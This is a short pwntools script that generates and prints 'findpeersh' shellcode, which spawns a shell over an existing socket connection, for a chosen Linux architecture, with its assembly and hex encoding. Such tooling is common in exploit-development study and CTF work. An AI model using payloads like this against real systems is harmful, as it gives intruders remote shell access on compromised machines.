#!/usr/bin/env python3

from pwn import *
import sys

if len(sys.argv) > 1:
    arch = sys.argv[1]
else:
    arch = 'amd64'

context(arch = arch, os = 'linux')

assembly = shellcraft.findpeersh()
print('    /* findpeersh shellcode on %s architecture */' % arch)
print(assembly)
print('    /* Assembled: %s */' % enhex(asm(assembly)))
